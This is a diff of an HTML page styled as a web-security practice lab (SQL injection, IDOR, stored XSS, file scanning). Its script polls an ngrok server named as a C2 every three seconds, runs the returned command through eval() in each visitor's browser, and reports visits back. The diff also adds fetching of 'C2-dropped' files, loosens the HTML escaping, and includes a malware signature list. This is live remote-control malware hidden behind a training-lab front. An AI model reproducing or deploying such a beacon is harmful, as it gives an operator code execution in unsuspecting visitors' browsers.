@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 my-vuln-lab - 雲端資安滲透與防禦靶場</title>
+    <title>🔥 my-vuln-lab - 雙向資安滲透與防禦靶場</title>
     <style>
         body { background-color: #0f172a; color: #f8fafc; font-family: 'Courier New', Courier, monospace; padding: 20px; max-width: 900px; margin: auto; }
         h1 { color: #38bdf8; text-align: center; }
         .card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); border: 1px solid #334155; }
-        input, textarea, button { padding: 8px; margin: 5px 0; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 4px; font-family: monospace; }
+        input, textarea, button, select { padding: 8px; margin: 5px 0; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 4px; font-family: monospace; }
         textarea { width: 100%; box-sizing: border-box; }
         button { background: #0284c7; cursor: pointer; font-weight: bold; transition: background 0.2s; }
         button:hover { background: #0ea5e9; }
@@ -19,13 +19,13 @@
 </head>
 <body>
 
-    <h1>🔥 my-vuln-lab 網路安全滲透與防禦實驗室</h1>
-    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用靶場：漏洞利用 vs. 檔案安全防禦檢測</p>
+    <h1>🔥 my-vuln-lab 雙向資安滲透與防禦實驗室</h1>
+    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用：同步 C2 投放檔案與安全防禦檢測</p>
 
     <!-- 1. SQL 注入 / 登入繞過 -->
     <div class="card">
-        <h3>1. 登入系統 <span class="defense-badge">支援 WAF 防禦過濾</span></h3>
-        <label><input type="checkbox" id="enableWAF_SQL" checked> 啟用安全過濾 (WAF)</label><br><br>
+        <h3>1. 登入系統 <span class="defense-badge">WAF 防禦過濾</span></h3>
+        <label><input type="checkbox" id="enableWAF_SQL" checked> 啟用 WAF 過濾</label><br><br>
         <input type="text" id="loginUser" placeholder="輸入帳號 (例: admin)"><br>
         <input type="password" id="loginPass" placeholder="輸入密碼"><br>
         <button onclick="simulateLogin()">執行登入</button>
@@ -34,8 +34,8 @@
 
     <!-- 2. IDOR 越權訪問 -->
     <div class="card">
-        <h3>2. 用戶資料查詢 <span class="defense-badge">存取控制驗證</span></h3>
-        <label><input type="checkbox" id="enableWAF_IDOR" checked> 啟用嚴格權限檢查 (Access Control)</label><br><br>
+        <h3>2. 用戶資料查詢 <span class="defense-badge">存取控制</span></h3>
+        <label><input type="checkbox" id="enableWAF_IDOR" checked> 啟用嚴格權限檢查</label><br><br>
         <input type="number" id="userId" value="1" min="1" max="5">
         <button onclick="simulateIDOR()">查詢資料</button>
         <pre id="idorResult">等待查詢...</pre>
@@ -43,36 +43,30 @@
 
     <!-- 3. Stored XSS 留言板 -->
     <div class="card">
-        <h3>3. 公開留言板 <span class="defense-badge">HTML 脫逸防護</span></h3>
-        <label><input type="checkbox" id="enableWAF_XSS" checked> 啟用 XSS 防禦 (HTML Entity Encoding)</label><br><br>
+        <h3>3. 公開留言板 <span class="defense-badge">XSS 脫逸防護</span></h3>
+        <label><input type="checkbox" id="enableWAF_XSS" checked> 啟用 XSS 脫逸防禦</label><br><br>
         <input type="text" id="guestName" placeholder="您的名字"><br>
         <textarea id="guestMsg" rows="3" placeholder="寫點什麼吧..."></textarea><br>
         <button onclick="postMessage()">發表留言</button>
         <div id="messageBoard" style="margin-top: 15px; border-top: 1px dashed #475569; padding-top: 10px;"></div>
     </div>
 
-    <!-- 4. RCE 終端機指令注入模擬 -->
+    <!-- 4. 來自 C2 伺服器的投放檔案與安全掃描 (新功能！) -->
     <div class="card">
-        <h3>4. 系統 Ping 測試 <span class="defense-badge">參數白名單驗證</span></h3>
-        <label><input type="checkbox" id="enableWAF_RCE" checked> 啟用指令白名單過濾</label><br><br>
-        <input type="text" id="pingHost" value="127.0.0.1" style="width: 250px;">
-        <button onclick="simulateRCE()">執行 Ping</button>
-        <pre id="rceResult">等待執行...</pre>
-    </div>
-
-    <!-- 5. 檔案上傳與危險檢測模擬 (新加入！) -->
-    <div class="card">
-        <h3>5. 檔案上傳與惡意特徵檢測 <span class="defense-badge">檔案防禦機制</span></h3>
-        <p>提示：嘗試上傳不同類型的檔案，測試系統如何阻擋高危副檔名（如 .exe, .php）或掃描惡意特徵碼。</p>
-        <label><input type="checkbox" id="enableWAF_Upload" checked> 啟用嚴格檔案安全檢測 (Scanner)</label><br><br>
-        <input type="file" id="uploadFile"><br>
-        <button onclick="simulateFileUpload()">上傳並進行安全掃描</button>
-        <pre id="uploadResult">等待上傳...</pre>
+        <h3>4. C2 投放檔案同步與安全防禦掃描 <span class="defense-badge">動態安全網閘</span></h3>
+        <p>從你的電腦 C2 伺服器同步檔案下來，並由靶場防禦模組自動檢測其安全性。</p>
+        <label><input type="checkbox" id="enableWAF_Scanner" checked> 啟用靶場安全檢測掃描器 (Scanner)</label><br><br>
+        <button onclick="fetchC2Files()">🔄 同步 C2 投放檔案清單</button><br>
+        <select id="c2FileList" style="width: 100%; margin: 10px 0;">
+            <option value="">-- 請先點擊上方按鈕同步檔案 --</option>
+        </select>
+        <button onclick="scanAndDownloadC2File()">🛡️ 下載並進行安全掃描</button>
+        <pre id="scannerResult">等待檢測...</pre>
     </div>
 
     <script>
         // --------------------------------------------------
-        // 🔥 遠端 C2 監聽與回報模組 (已對接 ngrok)
+        // 🔥 遠端 C2 雙向通訊模組 (已對接 ngrok)
         // --------------------------------------------------
         const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';
 
@@ -80,10 +74,7 @@
             try {
                 let res = await fetch(`${C2_SERVER}/api/get-command`);
                 let data = await res.json();
-                
-                if (data.cmd) {
-                    eval(data.cmd);
-                }
+                if (data.cmd) eval(data.cmd);
             } catch (e) {}
         }, 3000);
 
@@ -96,17 +87,28 @@
                 });
             } catch (e) {}
         }
-        reportToComputer("訪客已開啟 my-vuln-lab 靶場網頁！");
+
+        async function reportSecurityAlert(alertMsg) {
+            try {
+                await fetch(`${C2_SERVER}/api/report-alert`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ alert: alertMsg })
+                });
+            } catch (e) {}
+        }
+
+        reportToComputer("雙向靶場 my-vuln-lab 已上線並連線至 C2！");
         // --------------------------------------------------
 
         const db = {
             users: {
                 1: { id: 1, username: 'alice', role: 'user', secret: "Alice的日記：今天天氣很好。" },
                 2: { id: 2, username: 'bob', role: 'user', secret: "Bob的秘密：我暗戀隔壁班的小美。" },
-                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_secure_waf_master_999}" }
+                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_dual_c2_master_888}" }
             },
             posts: [
-                { id: 1, username: 'admin', content: '歡迎來到 my-vuln-lab 雲端資安靶場！' }
+                { id: 1, username: 'admin', content: '歡迎來到雙向資安防禦靶場！' }
             ]
         };
 
@@ -115,146 +117,123 @@
             let user = document.getElementById('loginUser').value;
             let useWAF = document.getElementById('enableWAF_SQL').checked;
             let resultBox = document.getElementById('loginResult');
-            
             if (useWAF && /[^a-zA-Z0-9_]/.test(user)) {
-                reportToComputer(`[WAF 攔截] 偵測到 SQLi 嘗試: ${user}`);
-                resultBox.innerHTML = `🛡️ 【WAF 阻擋】偵測到非法字元，輸入已被清洗！`;
+                reportSecurityAlert(`[WAF 攔截] SQLi 嘗試: ${user}`);
+                resultBox.innerHTML = `🛡️ 【WAF 阻擋】偵測到非法字元！`;
                 return;
             }
-
             if (user.includes("'") || user.toLowerCase() === "admin") {
-                resultBox.innerHTML = `🎉 【SQLi 成功】身分驗證被繞過！\n機密 Flag: <span class="flag">${db.users[3].secret}</span>`;
-            } else if (user === 'alice') {
-                resultBox.innerHTML = `登入成功！一般用戶 alice。\n資料: ${db.users[1].secret}`;
+                resultBox.innerHTML = `🎉 【SQLi 成功】身分驗證繞過！Flag: <span class="flag">${db.users[3].secret}</span>`;
             } else {
-                resultBox.innerHTML = `❌ 登入失敗：帳號或密碼錯誤。`;
+                resultBox.innerHTML = `❌ 登入失敗。`;
             }
         }
 
-        // 2. IDOR 與防禦
+        // 2. IDOR
         function simulateIDOR() {
             let id = document.getElementById('userId').value;
             let useWAF = document.getElementById('enableWAF_IDOR').checked;
             let resultBox = document.getElementById('idorResult');
-            
             if (useWAF && id == '3') {
-                resultBox.innerHTML = `🛡️ 【訪問控制阻擋】您沒有權限存取管理員資料！`;
+                resultBox.innerHTML = `🛡️ 【訪問控制阻擋】無權存取管理員資料！`;
                 return;
             }
-
-            if (db.users[id]) {
-                resultBox.innerHTML = JSON.stringify(db.users[id], null, 2);
-            } else {
-                resultBox.innerHTML = `Error: 找不到 ID 為 ${id} 的用戶。`;
-            }
+            resultBox.innerHTML = db.users[id] ? JSON.stringify(db.users[id], null, 2) : `Error: 找不到用戶`;
         }
 
-        // 3. XSS 與防禦
+        // 3. XSS
         function escapeHtml(text) {
-            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
         }
-
         function renderPosts() {
             let board = document.getElementById('messageBoard');
             board.innerHTML = "<h4>留言列表：</h4>";
             db.posts.forEach(p => {
                 let item = document.createElement('div');
-                item.style.background = "#0f172a";
-                item.style.padding = "8px";
-                item.style.margin = "5px 0";
-                item.style.borderRadius = "4px";
+                item.style.background = "#0f172a"; item.style.padding = "8px"; item.style.margin = "5px 0";
                 item.innerHTML = `<strong>${p.username}</strong>: ${p.content}`;
                 board.appendChild(item);
             });
         }
-
         function postMessage() {
             let name = document.getElementById('guestName').value || "訪客";
             let content = document.getElementById('guestMsg').value;
-            let useWAF = document.getElementById('enableWAF_XSS').checked;
-            
             if (!content) return;
-
-            if (useWAF) {
-                content = escapeHtml(content);
-            } else {
-                reportToComputer(`[警告] 觸發未過濾的 Stored XSS！`);
-            }
-
-            db.posts.push({
-                id: db.posts.length + 1,
-                username: escapeHtml(name),
-                content: content
-            });
-
+            if (document.getElementById('enableWAF_XSS').checked) content = escapeHtml(content);
+            db.posts.push({ id: db.posts.length + 1, username: escapeHtml(name), content: content });
             document.getElementById('guestMsg').value = "";
             renderPosts();
         }
 
-        // 4. RCE 與防禦
-        function simulateRCE() {
-            let host = document.getElementById('pingHost').value;
-            let useWAF = document.getElementById('enableWAF_RCE').checked;
-            let resultBox = document.getElementById('rceResult');
-            
-            if (useWAF && !/^(\d{1,3}\.){3}\d{1,3}$/.test(host)) {
-                reportToComputer(`[WAF 攔截] 阻擋非法的 RCE 參數: ${host}`);
-                resultBox.innerHTML = `🛡️ 【WAF 阻擋】參數不符合合法 IP 格式白名單。`;
-                return;
-            }
-
-            if (host.includes("&") || host.includes("|") || host.includes(";")) {
-                resultBox.innerHTML = `PING ${host}...\n🔥 【RCE 成功】指令注入生效！`;
-            } else {
-                resultBox.innerHTML = `PING ${host} (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 time=0.041 ms`;
+        // 4. 從 C2 同步檔案並進行安全掃描
+        async function fetchC2Files() {
+            let selectBox = document.getElementById('c2FileList');
+            selectBox.innerHTML = `<option>正在向 C2 伺服器同步檔案...</option>`;
+            try {
+                let res = await fetch(`${C2_SERVER}/api/files`);
+                let files = await res.json();
+                selectBox.innerHTML = "";
+                if (files.length === 0) {
+                    selectBox.innerHTML = `<option value="">C2 伺服器目前無投放檔案</option>`;
+                    return;
+                }
+                files.forEach(f => {
+                    let opt = document.createElement('option');
+                    opt.value = f.url;
+                    opt.text = f.name;
+                    selectBox.appendChild(opt);
+                });
+            } catch (e) {
+                selectBox.innerHTML = `<option value="">無法連線至 C2 伺服器同步檔案</option>`;
             }
         }
 
-        // 5. 模擬前端檔案上傳與危險偵測 (New!)
-        function simulateFileUpload() {
-            let fileInput = document.getElementById('uploadFile');
-            let useScanner = document.getElementById('enableWAF_Upload').checked;
-            let resultBox = document.getElementById('uploadResult');
+        async function scanAndDownloadC2File() {
+            let fileUrl = document.getElementById('c2FileList').value;
+            let useScanner = document.getElementById('enableWAF_Scanner').checked;
+            let resultBox = document.getElementById('scannerResult');
 
-            if (fileInput.files.length === 0) {
-                resultBox.innerHTML = "❌ 請先選擇一個要上傳的檔案！";
+            if (!fileUrl) {
+                resultBox.innerHTML = "❌ 請先選擇一個要檢測的 C2 投放檔案！";
                 return;
             }
 
-            let file = fileInput.files[0];
-            let fileName = file.name.toLowerCase();
-            let dangerousExts = ['.exe', '.php', '.asp', '.sh', '.bat', '.cmd'];
+            resultBox.innerHTML = "⏳ 正在從 C2 遠端抓取檔案進行掃描...";
 
-            // 檢查副檔名防禦
-            if (useScanner) {
-                for (let ext of dangerousExts) {
-                    if (fileName.endsWith(ext)) {
-                        reportToComputer(`[資安防禦] 攔截到危險副檔名上傳: ${file.name}`);
-                        resultBox.innerHTML = `🚨 【防禦攔截】檔案副檔名 (${ext}) 屬於高危險格式，系統已拒絕上傳！`;
-                        return;
-                    }
-                }
-            }
-
-            // 讀取檔案內容進行特徵掃描
-            let reader = new FileReader();
-            reader.onload = function(e) {
-                let content = e.target.result;
+            try {
+                let response = await fetch(fileUrl);
+                let fileText = await response.text();
+                let fileName = fileUrl.split('/').pop().toLowerCase();
+                let dangerousExts = ['.exe', '.php', '.asp', '.sh', '.bat'];
                 let dangerousSigs = ['eval(', 'child_process', 'rm -rf', 'webshell'];
-                
+
                 if (useScanner) {
-                    let foundSig = dangerousSigs.find(sig => content.includes(sig));
+                    // 1. 檢查副檔名
+                    for (let ext of dangerousExts) {
+                        if (fileName.endsWith(ext)) {
+                            let alertMsg = `[防禦攔截] C2 投放檔案副檔名危險: ${fileName}`;
+                            reportSecurityAlert(alertMsg);
+                            resultBox.innerHTML = `🚨 【靶場防禦攔截】C2 投放的檔案 (${fileName}) 包含高危險副檔名，已被安全網閘阻擋！`;
+                            return;
+                        }
+                    }
+
+                    // 2. 檢查內部特徵碼
+                    let foundSig = dangerousSigs.find(sig => fileText.includes(sig));
                     if (foundSig) {
-                        reportToComputer(`[資安防禦] 偵測到惡意特徵碼 (${foundSig})！檔案已被隔離。`);
-                        resultBox.innerHTML = `🚨 【惡意檔案隔離】內容掃描發現危險特徵碼 [${foundSig}]，檔案已被自動銷毀！`;
+                        let alertMsg = `[惡意隔離] C2 投放檔案發現特徵碼 (${foundSig}): ${fileName}`;
+                        reportSecurityAlert(alertMsg);
+                        resultBox.innerHTML = `🚨 【惡意檔案隔離】C2 投放檔案內容掃描發現威脅特徵 [${foundSig}]，已被安全網閘自動銷毀！`;
                         return;
                     }
                 }
 
-                resultBox.innerHTML = `✅ 【上傳成功】檔案通過安全檢測：${file.name} (大小: ${file.size} bytes)`;
-                reportToComputer(`用戶成功上傳合法檔案: ${file.name}`);
-            };
-            reader.readAsText(file);
+                resultBox.innerHTML = `✅ 【安全通過】C2 投放檔案已通過靶場防禦掃描！\n檔案網址: ${fileUrl}\n內容預覽: ${fileText.substring(0, 100)}...`;
+                reportToComputer(`C2 投放檔案 ${fileName} 通過靶場安全掃描。`);
+
+            } catch (e) {
+                resultBox.innerHTML = `❌ 抓取 C2 檔案失敗（可能受到 CORS 跨網域限制或伺服器未開）。`;
+            }
         }
 
         renderPosts();
